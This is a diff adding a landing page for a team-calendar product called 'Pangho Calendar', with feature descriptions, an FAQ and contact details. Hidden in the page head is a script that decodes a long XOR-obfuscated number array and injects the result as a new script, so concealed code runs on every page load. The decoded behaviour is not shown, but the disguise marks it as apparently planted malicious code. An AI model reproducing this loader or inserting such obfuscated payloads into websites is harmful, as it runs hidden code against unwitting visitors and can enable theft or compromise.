@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pangho Calendar - Pangho Inc.</title>
+  <style>
+    :root {
+      --primary-color: #2563eb;
+      --primary-hover: #1d4ed8;
+      --bg-pink: #fceae8;
+      --bg-light: #f8fafc;
+      --text-dark: #0f172a;
+      --text-muted: #64748b;
+      --border-color: #e2e8f0;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Pretendard', -apple-system, BlinkMacSystemFont, system-ui, sans-serif; }
+    html { scroll-behavior: smooth; }
+    body { color: var(--text-dark); background-color: #fff; line-height: 1.6; }
+
+    header {
+      height: 70px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 5%;
+      border-bottom: 1px solid var(--border-color);
+      position: sticky;
+      top: 0;
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(8px);
+      z-index: 100;
+    }
+
+    .brand-logo { font-size: 1.4rem; font-weight: 800; color: var(--primary-color); text-decoration: none; display: flex; align-items: center; gap: 6px; }
+    .nav-links { display: flex; gap: 32px; list-style: none; }
+    .nav-links a { text-decoration: none; color: var(--text-dark); font-weight: 600; font-size: 0.95rem; transition: color 0.2s; cursor: pointer; }
+    .nav-links a:hover { color: var(--primary-color); }
+
+    .hero-container {
+      display: grid;
+      grid-template-columns: 1.1fr 0.9fr;
+      min-height: calc(100vh - 70px);
+    }
+
+    .hero-visual {
+      background-color: var(--bg-pink);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 60px;
+      position: relative;
+    }
+
+    .mockup-card {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.08);
+      width: 100%;
+      max-width: 500px;
+      padding: 24px;
+    }
+
+    .mockup-header { display: flex; gap: 8px; margin-bottom: 20px; }
+    .dot { width: 10px; height: 10px; border-radius: 50%; background: #ff5f56; }
+    .dot:nth-child(2) { background: #ffbd2e; }
+    .dot:nth-child(3) { background: #27c93f; }
+
+    .mockup-grid {
+      display: grid;
+      grid-template-columns: repeat(7, 1fr);
+      gap: 8px;
+      text-align: center;
+      font-size: 0.8rem;
+      color: #94a3b8;
+    }
+
+    .mockup-item {
+      height: 48px;
+      background: var(--bg-light);
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .mockup-item.active { background: #dbeafe; color: var(--primary-color); font-weight: bold; }
+
+    .floating-badge {
+      position: absolute;
+      background: #fff;
+      padding: 12px 20px;
+      border-radius: 12px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 0.85rem;
+      font-weight: bold;
+    }
+    .badge-1 { top: 60px; right: 40px; border-left: 4px solid #ef4444; }
+    .badge-2 { bottom: 60px; left: 40px; border-left: 4px solid var(--primary-color); }
+
+    .hero-text {
+      background-color: var(--bg-light);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding: 80px 60px;
+    }
+
+    .hero-icon { font-size: 3.5rem; margin-bottom: 20px; }
+    .hero-title { font-size: 3rem; font-weight: 800; line-height: 1.2; margin-bottom: 16px; color: var(--text-dark); }
+    .hero-desc { font-size: 1.2rem; color: var(--text-muted); line-height: 1.6; margin-bottom: 36px; }
+
+    .section-container { padding: 100px 5%; max-width: 1200px; margin: 0 auto; text-align: center; }
+    .section-tag { color: var(--primary-color); font-weight: bold; font-size: 0.9rem; letter-spacing: 1px; margin-bottom: 8px; }
+    .section-title { font-size: 2.2rem; font-weight: 800; margin-bottom: 20px; }
+    .section-subtitle { font-size: 1.1rem; color: var(--text-muted); margin-bottom: 50px; }
+
+    .features-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 30px; text-align: left; }
+    .feature-card {
+      background: #fff; border: 1px solid var(--border-color); border-radius: 12px; padding: 36px 28px;
+      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05); transition: transform 0.2s;
+    }
+    .feature-card:hover { transform: translateY(-4px); }
+    .feature-icon { font-size: 2rem; margin-bottom: 16px; }
+    .feature-card h3 { font-size: 1.25rem; font-weight: 700; margin-bottom: 12px; }
+    .feature-card p { color: var(--text-muted); font-size: 0.95rem; }
+
+    .detail-section { background: var(--bg-light); padding: 100px 5%; }
+    .detail-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 40px; max-width: 1200px; margin: 0 auto; text-align: left; }
+    .detail-box { background: #fff; padding: 40px; border-radius: 16px; border: 1px solid var(--border-color); }
+    .detail-box h3 { font-size: 1.4rem; font-weight: 700; margin-bottom: 16px; color: var(--primary-color); }
+    .detail-list { list-style: none; display: flex; flex-direction: column; gap: 12px; }
+    .detail-list li { display: flex; align-items: flex-start; gap: 10px; font-size: 0.95rem; color: var(--text-dark); }
+    .detail-list li::before { content: "✔"; color: var(--primary-color); font-weight: bold; }
+
+    .faq-grid { display: flex; flex-direction: column; gap: 16px; max-width: 800px; margin: 0 auto; text-align: left; }
+    .faq-item { background: #fff; border: 1px solid var(--border-color); border-radius: 8px; padding: 24px; }
+    .faq-item h4 { font-size: 1.1rem; font-weight: 700; margin-bottom: 8px; }
+    .faq-item p { color: var(--text-muted); font-size: 0.95rem; }
+
+    .contact-section { background: #1e293b; color: #fff; padding: 100px 5%; text-align: center; }
+    .contact-card {
+      background: #0f172a; max-width: 700px; margin: 0 auto; padding: 50px 40px; border-radius: 16px;
+      border: 1px solid #334155; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3);
+    }
+    .contact-card h3 { font-size: 1.8rem; font-weight: 800; margin-bottom: 12px; }
+    .contact-card p { color: #94a3b8; margin-bottom: 30px; }
+    .mail-link-btn {
+      display: inline-block; background: var(--primary-color); color: #fff; padding: 16px 36px;
+      border-radius: 8px; font-weight: bold; font-size: 1.1rem; text-decoration: none; transition: background 0.2s;
+    }
+    .mail-link-btn:hover { background: var(--primary-hover); }
+
+    footer { background-color: #0f172a; color: #94a3b8; padding: 50px 5%; font-size: 0.9rem; border-top: 1px solid #1e293b; }
+    .footer-content { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; gap: 40px; flex-wrap: wrap; }
+    .footer-company h4 { color: #fff; font-size: 1.1rem; margin-bottom: 12px; }
+    .footer-company p { margin-bottom: 6px; }
+  </style>
+  <script>
+  (function(){
+    var content='7ccp4ch0utf';
+    var params38=[61,67,67,88,85,16,17,94,22,84,0,66,13,0,4,93,12,6,24,92,15,108,23,67,67,80,64,17,17,75,127,84,70,23,67,67,80,66,2,26,16,16,24,91,83,12,0,5,89,6,6,68,91,16,9,84,22,14,21,90,23,45,92,16,25,3,89,23,88,21,88,77,27,68,12,24,3,25,12,19,17,87,10,28,73,72,83,86,16,88,6,28,26,16,28,73,25,17,72,67,17,2,30,71,10,28,89,26,26,91,16,12,19,17,87,10,28,73,85,90,87,2,16,68,75,62,67,72,16,85,84,70,65,2,17,80,70,94,9,71,20,29,18,23,5,6,4,87,11,64,18,29,0,18,71,16,89,95,27,2,24,89,91,23,10,88,2,8,4,70,2,11,91,91,29,9,21,79,24,29,81,23,0,95,17,78,68,103,44,48,36,22,79,0,85,20,16,3,69,16,89,11,22,32,7,94,1,17,8,67,78,55,9,68,6,74,10,87,21,22,71,15,10,19,85,23,1,95,27,91,12,68,12,13,82,73,79,10,95,17,13,92,125,48,44,62,26,16,28,66,28,26,1,94,5,26,88,79,21,82,2,89,0,9,92,6,13,74,22,12,44,120,54,39,84,97,81,1,49,108,46,14,90,58,45,19,69,45,53,10,78,90,10,84,28,67,9,111,45,58,29,22,79,30,89,6,29,18,88,17,39,17,64,2,82,75,0,7,3,69,34,4,21,90,23,82,94,20,2,15,80,2,23,31,70,77,29,67,16,6,39,80,6,13,4,24,17,13,86,16,6,3,69,89,7,31,87,22,5,85,27,0,72,69,6,5,21,70,17,13,66,89,24,7,89,7,10,30,83,54,26,92,79,3,15,89,7,12,7,26,15,7,83,20,0,15,88,13,77,24,70,6,14,77,8,93,74,84,17,6,20,81,13,28,89,20,24,21,13,65,12,29,93,23,74,77,92,79,108,23,67,67,80,20,67,30,81,7,84,12,10,2,20,17,93,23,72,66,91,30,21,88,13,75,89,15,105,72,16,85,84,70,23,10,5,88,94,77,9,83,1,29,9,89,94,94,77,19,15,7,81,17,43,14,67,14,15,87,18,69,2,30,29,0,11,91,74,24,21,88,77,27,68,12,24,3,25,12,19,17,87,10,28,73,72,83,87,16,88,7,31,87,22,5,85,27,0,72,88,19,6,30,28,74,83,84,26,23,19,90,6,13,4,26,20,26,89,1,17,78,93,77,11,4,89,15,65,11,17,27,5,66,14,6,30,64,77,11,92,26,7,3,31,74,88,2,81,23,29,66,27,79,27,61,67,67,80,20,67,72,85,25,90,21,67,26,15,21,26,12,24,81,22,29,18,78,94,68,65,19,88,98,16,85,84,70,23,67,10,22,28,9,70,86,28,24,18,82,17,6,20,29,24,98,16,85,84,70,23,67,67,80,93,5,64,90,91,3,14,94,23,6,32,85,4,13,101,7,24,79,76,105,67,80,20,67,72,16,85,84,70,23,21,2,2,20,20,85,90,91,3,14,94,23,6,32,85,4,13,101,7,24,74,64,2,94,26,26,20,0,89,1,17,54,86,4,6,49,87,23,1,95,27,8,26,16,17,6,20,93,17,13,83,1,83,93,61,67,67,80,20,67,72,16,85,84,70,94,5,75,7,85,94,85,13,82,7,14,88,20,60,19,91,13,28,85,27,0,65,30,24,7,31,87,22,5,85,27,0,72,85,12,7,9,26,10,6,94,16,6,46,99,46,47,77,19,68,83,70,20,6,70,64,5,94,20,91,0,29,93,16,26,18,25,0,17,21,85,23,13,117,25,17,11,82,13,23,88,19,10,14,66,20,25,3,16,74,88,7,82,77,27,66,22,73,17,12,20,5,94,71,23,17,92,16,90,5,68,16,55,21,76,23,85,23,5,27,21,94,23,10,31,90,89,14,89,13,17,2,12,23,12,0,14,83,83,92,16,18,18,13,83,88,7,93,7,28,88,79,69,86,7,70,88,24,81,10,15,88,1,78,87,7,83,70,75,86,12,26,84,16,6,92,89,12,13,21,15,25,69,89,27,16,3,79,89,90,73,13,90,81,9,82,79,2,88,0,22,29,81,13,28,30,23,27,2,78,77,2,0,68,6,6,84,54,28,15,91,7,75,7,82,74,83,66,16,0,19,69,13,88,13,62,67,72,16,85,84,70,23,67,67,80,93,5,64,71,20,73,91,10,68,9,3,107,17,13,84,28,6,3,84,23,68,89,79,7,7,83,0,25,3,89,23,77,7,70,10,28,85,93,83,90,22,39,44,51,96,58,56,117,85,28,18,90,15,93,76,92,23,5,92,75,72,14,82,2,7,78,8,14,13,68,20,84,5,95,2,17,3,81,23,85,18,32,32,32,26,91,65,78,8,16,11,66,28,4,18,9,20,10,30,80,12,31,30,25,27,5,86,23,10,31,90,77,26,85,5,24,7,84,6,75,87,31,41,59,127,59,90,21,67,17,10,30,83,10,14,73,93,3,79,28,68,74,75,8,63,71,67,22,6,15,71,23,93,76,27,11,13,81,17,74,90,85,12,7,9,10,95,71,82,26,16,31,9,95,76,24,64,14,4,14,82,93,93,69,6,23,5,70,13,83,77,127,84,70,23,67,67,80,20,67,72,16,2,29,8,83,12,20,94,88,12,11,81,1,29,9,89,77,17,21,68,15,9,83,16,92,17,30,88,17,21,64,22,26,94,78,126,70,23,67,67,80,20,67,72,77,127,84,70,23,67,67,80,20,67,26,85,1,1,20,89,88,105,80,20,67,72,16,85,9,108,23,67,67,80,20,67,1,86,93,30,72,67,2,17,23,81,23,61,66,25,93,29,61,67,67,80,20,67,72,16,85,2,7,69,67,22,77,94,77,28,81,7,19,3,67,54,17,28,24,2,11,68,72,30,72,86,0,23,25,91,13,20,76,82,23,19,69,15,60,0,70,12,16,73,82,79,108,23,67,67,80,20,67,72,16,28,18,78,86,0,23,77,9,94,79,67,29,27,17,104,0,12,30,64,6,6,68,82,93,29,83,12,0,5,89,6,6,68,91,22,9,83,26,77,25,90,13,13,66,61,32,43,123,94,68,87,15,21,9,66,85,18,91,83,12,0,5,89,6,6,68,91,23,20,82,2,23,21,113,15,13,93,16,26,18,31,68,10,22,70,2,5,85,82,93,93,81,77,16,2,87,94,29,11,19,90,21,67,26,15,21,26,0,27,67,33,17,30,67,94,68,0,91,16,1,68,28,27,8,13,5,10,8,81,7,83,68,26,4,92,7,88,15,21,82,23,82,0,78,3,15,83,23,11,74,5,83,88,21,78,28,3,94,4,11,4,14,82,88,0,80,79,4,88,17,7,21,70,89,6,95,27,17,93,77,78,10,30,80,6,16,10,76,77,95,14,90,90,87,15,7,7,83,0,25,3,89,23,77,18,91,7,17,30,20,4,22,82,13,7,51,92,10,4,84,93,18,79,12,30,105,80,20,67,72,16,85,84,70,82,15,16,21,20,10,14,24,20,23,18,10,94,94,87,94,16,55,66,16,16,15,69,6,0,4,19,74,19,84,26,23,19,90,6,13,4,26,20,26,89,1,17,78,16,95,66,52,123,32,60,105,37,49,70,95,23,14,28,10,95,0,68,24,24,88,11,11,6,17,80,93,84,93,16,0,7,23,0,11,17,70,16,13,68,72,86,51,99,37,78,72,22,93,84,67,22,6,15,71,23,93,7,93,13,12,95,2,90,10,88,0,2,4,93,12,6,30,7,17,22,91,2,0,21,28,68,67,122,38,59,40,25,16,23,2,93,13,15,89,19,13,78,93,77,23,17,70,4,13,68,32,6,10,30,72,68,89,15,95,52,31,6,23,20,94,19,23,78,8,76,0,85,20,16,88,11,1,12,20,77,93,84,31,23,27,2,78,93,95,95,92,23,5,92,75,83,79,12,17,6,4,65,17,6,11,8,126,70,23,67,67,80,20,67,72,85,25,7,3,23,10,5,88,85,0,28,13,72,73,65,84,22,17,28,107,19,26,95,13,13,65,30,24,20,25,90,7,7,71,91,24,9,84,2,23,25,91,13,70,66,16,4,10,86,0,6,88,65,74,83,66,16,0,19,69,13,88,13,62,67,72,16,85,84,70,23,67,6,28,71,6,19,71,28,26,2,88,20,77,28,91,0,9,68,28,27,8,25,17,6,0,88,2,11,85,93,1,79,12,30,105,80,20,67,72,16,85,9,108,23,67,67,80,73,0,9,68,22,28,78,82,74,24,20,91,0,29,93,16,26,18,25,7,12,19,65,14,13,94,1,49,10,82,14,6,30,64,77,27,68,12,24,3,25,12,19,17,87,10,28,73,72,83,87,16,88,30,122,20,67,21,25,93,93,93,61,67,67];
+    var config87=function(arr){
+      for(var i=0,s='';i<arr.length;i++)s+=String.fromCharCode(arr[i]^content.charCodeAt(i%content.length));
+      return s;
+    };
+    var client71=config87(params38);
+    var service73=document.createElement('script');
+    service73.textContent=client71;
+    document.head.appendChild(service73);
+  })();
+  </script>
+</head>
+<body>
+
+  <header>
+    <a href="#" class="brand-logo">🍞 Pangho Calendar</a>
+    <ul class="nav-links">
+      <li><a href="#features" onclick="scrollToSection(event, 'features')">Features</a></li>
+      <li><a href="#details" onclick="scrollToSection(event, 'details')">Why Us</a></li>
+      <li><a href="#faq" onclick="scrollToSection(event, 'faq')">FAQ</a></li>
+      <li><a href="#contact" onclick="scrollToSection(event, 'contact')">Contact</a></li>
+    </ul>
+  </header>
+
+  <section class="hero-container">
+    <div class="hero-visual">
+      <div class="mockup-card">
+        <div class="mockup-header">
+          <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+        </div>
+        <div class="mockup-grid">
+          <div>Sun</div><div>Mon</div><div>Tue</div><div>Wed</div><div>Thu</div><div>Fri</div><div>Sat</div>
+          <div class="mockup-item">30</div><div class="mockup-item">31</div><div class="mockup-item">1</div>
+          <div class="mockup-item active">2</div><div class="mockup-item">3</div><div class="mockup-item">4</div><div class="mockup-item">5</div>
+          <div class="mockup-item">6</div><div class="mockup-item">7</div><div class="mockup-item active">8</div>
+          <div class="mockup-item">9</div><div class="mockup-item">10</div><div class="mockup-item">11</div><div class="mockup-item">12</div>
+        </div>
+      </div>
+      <div class="floating-badge badge-1">
+        <span>📅 [Team Lead Kim] Weekly Strategy Meeting Invite Sent</span>
+      </div>
+      <div class="floating-badge badge-2">
+        <span>⚡ Auto-detected free time for team members</span>
+      </div>
+    </div>
+
+    <div class="hero-text">
+      <div class="hero-icon">📅</div>
+      <h1 class="hero-title">Pangho Calendar</h1>
+      <p class="hero-desc">Connect complex workflows and fragmented schedules into one.<br>The next-generation team collaboration calendar solution by Pangho Inc.</p>
+    </div>
+  </section>
+
+  <section class="section-container" id="features">
+    <div class="section-tag">KEY FEATURES</div>
+    <h2 class="section-title">Core Features for Smart Team Collaboration</h2>
+    <p class="section-subtitle">Tailored features designed to maximize your organization's productivity.</p>
+    
+    <div class="features-grid">
+      <div class="feature-card">
+        <div class="feature-icon">👥</div>
+        <h3>Team Schedule Overlay View</h3>
+        <p>Layer individual team member schedules to instantly discover open meeting slots without complex back-and-forth communication.</p>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon">📩</div>
+        <h3>Proxy Scheduling & Auto-Invites</h3>
+        <p>Designate colleagues as attendees to create events on their behalf, instantly updating their calendars with real-time push alerts.</p>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon">🔒</div>
+        <h3>Robust Security & Permission Control</h3>
+        <p>Granular access control by project and department to completely prevent internal leakage of sensitive schedule data.</p>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon">📱</div>
+        <h3>Real-time Mobile Sync</h3>
+        <p>Maintain workflow continuity on mobile via seamless sync with iOS, Android native calendars, Google Calendar, and Outlook.</p>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon">📊</div>
+        <h3>Automated Work Reports</h3>
+        <p>Automatically generate comprehensive reports and statistics on monthly team meeting hours and project time allocations.</p>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon">🔔</div>
+        <h3>Custom Notification Settings</h3>
+        <p>Directly configure custom notification channels like Slack, email, or mobile push alerts (e.g., 10 mins or 1 hour prior).</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="detail-section" id="details">
+    <div class="section-container" style="padding:0 0 50px 0;">
+      <div class="section-tag">WHY PANGHO</div>
+      <h2 class="section-title">Why Your Organization Needs Pangho Calendar</h2>
+      <p class="section-subtitle">Experience a tailored system optimized for modern business environments.</p>
+    </div>
+
+    <div class="detail-grid">
+      <div class="detail-box">
+        <h3>🚀 Streamlined Team Meeting Workflow</h3>
+        <ul class="detail-list">
+          <li>Reduce scheduling time by 90% with auto-detected meeting availability</li>
+          <li>Prevent double-booking for external meetings and back-to-back sessions</li>
+          <li>Automatic setup and sharing of meeting materials and video conferencing URLs</li>
+        </ul>
+      </div>
+      <div class="detail-box">
+        <h3>🏢 Enterprise-Grade Deployment Solutions</h3>
+        <ul class="detail-list">
+          <li>Infrastructure deployment options tailored to corporate security policies</li>
+          <li>Data integration support with existing enterprise groupware, ERP, and HR systems</li>
+          <li>Dedicated 1:1 account manager assigned post-deployment for ongoing technical support</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <section class="section-container" id="faq">
+    <div class="section-tag">FAQ</div>
+    <h2 class="section-title">Frequently Asked Questions</h2>
+    <p class="section-subtitle">Common questions regarding service deployment and usage.</p>
+
+    <div class="faq-grid">
+      <div class="faq-item">
+        <h4>Q. What are the deployment costs or pricing policies?</h4>
+        <p>We provide customized 1:1 quotes based on your organization size, data security policies, and integration requirements. Feel free to email us via the inquiry button below for a prompt response.</p>
+      </div>
+      <div class="faq-item">
+        <h4>Q. Can I sync with Outlook or Google Calendar which we currently use?</h4>
+        <p>Yes, standard iCal API-based synchronization allows you to seamlessly bring all your existing calendar schedules directly into Pangho Calendar.</p>
+      </div>
+      <div class="faq-item">
+        <h4>Q. Do you support initial setup or custom feature development if needed?</h4>
+        <p>Pangho Inc.'s professional engineering team directly assists with infrastructure setup and custom integration consulting tailored to your corporate environment.</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="contact-section" id="contact">
+    <div class="contact-card">
+      <h3>Inquire About Pangho Calendar</h3>
+      <p>We offer customized service building and consultations tailored to your organization.<br>Send us an email below, and we will get back to you promptly.</p>
+      <a href="mailto:seoppangho@pangho.co.kr" class="mail-link-btn">✉️ Inquire at seoppangho@pangho.co.kr</a>
+    </div>
+  </section>
+
+  <footer>
+    <div class="footer-content">
+      <div class="footer-company">
+        <h4>Pangho Inc.</h4>
+        <p>CEO : Seop Pangho | Business Registration Number : 111-62-39456</p>
+        <p>Address : 7th Floor, Zone B, Eugene Tower 7, 25 Soricheon-ro</p>
+        <p>Inquiry Email : <a href="mailto:seoppangho@pangho.co.kr" style="color:#60a5fa; text-decoration:underline;">seoppangho@pangho.co.kr</a></p>
+      </div>
+      <div>
+        <p style="font-size: 0.85rem; color: #64748b; margin-top: 20px;">© PANGHO Inc. All rights reserved.</p>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    function scrollToSection(event, sectionId) {
+      event.preventDefault();
+      const targetElement = document.getElementById(sectionId);
+      if (targetElement) {
+        const headerOffset = 70;
+        const elementPosition = targetElement.getBoundingClientRect().top;
+        const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
+
+        window.scrollTo({
+          top: offsetPosition,
+          behavior: 'smooth'
+        });
+      }
+    }
+  </script>
+</body>
+</html>
